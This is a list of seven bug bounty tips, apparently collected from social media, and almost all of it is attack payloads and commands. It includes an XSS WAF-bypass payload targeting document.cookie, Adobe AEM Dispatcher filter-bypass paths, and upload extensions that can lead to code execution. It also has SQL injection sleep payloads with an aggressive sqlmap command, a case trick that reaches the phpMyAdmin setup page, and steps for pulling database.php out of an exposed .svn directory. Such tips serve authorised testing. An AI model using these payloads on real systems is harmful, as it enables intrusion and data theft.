[ ] Tips 1
```
XSS WAF Bypass using location concatenation: 

Payload:
"><BODy onbeforescriptexecute="x1='cookie';c=')';b='a';location='jav'+b+'script:con'+'fir\u006d('+'document'+'.'+x1+c">
```

[ ] Tips 2
```
[+] Another awesome Adobe AEM Dispatcher filter bypass technique? oh okay

Hunting for JSON GET Servlet on /content.1.json however result = 404?

Try this:

/conten/.1.json 
/conten/t.1.json
/content.tidy.1.json
/conten/.tidy.infinity.json
```

[ ] Tips 3
```
Try these file-uploading extensions accordingly.

ASP Applications:

.asa -> potential remote code execution

.asax -> potential remote code execution

.asp -> potential remote code execution

.aspx -> potential remote code execution

Java Applications: 

.jsp -> potential remote code execution

.jspx -> potential remote code execution

Perl Applications: 

.pl -> potential remote code execution

Python Applications: 

.py -> potential remote code execution

Ruby Applications:

.rb -> potential remote code execution

Other files that should be restricted for most applications: 

.bat
.cgi
.exe
.htm -> potential XSS
.html -> potential XSS
.jar
.rar
.shtml
.svg -> potential XSS
.swf -> potential XSS
.tar
.zip
.cer -> potential XSS
.hxt -> potential XSS
.stm -> potential XSS
```

[ ] Tips 4
```
For first time i found a SQL Injection On **sitemap.xml** endpoint 😎😎

#bugbountytips #bugbountytip 

target[.]com/sitemap.xml?offset=1;SELECT IF((8303>8302),SLEEP(9),2356)#

sleep payload 
[1;SELECT IF((8303>8302),SLEEP(9),2356)#] = 9s

For who asking about sqlmap command in this case 

sqlmap -u "target/sitemap.xml?offset=1" -p offset --level 5 --risk 3 --dbms=MySQL --hostname --test-filter="MySQL >= 5.0.12 stacked queries"
```

[ ] Tips 5
```

target[.]com/phpmyadmin/setup/index.php
==> 301 to login page

target[.]com/phpMyAdmin/setup/index.php
==> 200 to phpmyadmin setup

phpmyadmin 301
phpMyAdmin 200
```

[ ] Tips 6
```
1. ./dirsearch.py -u target -e php,html,js,xml -x 500,403
2. found http://url.com/.svn/
3. clone & use https://github.com/anantshri/svn-extractor
4. ./svn-extractor.py --url http://url.com --match database.php
5. result in output dir and just open it
credit:@faizalabroni

```
[ ] Tips 7
```
SQLi via parameter name injection.

Payload:
someparam[id) VALUES (NULL); WAITFOR DELAY '0:0:5';--]=test
```
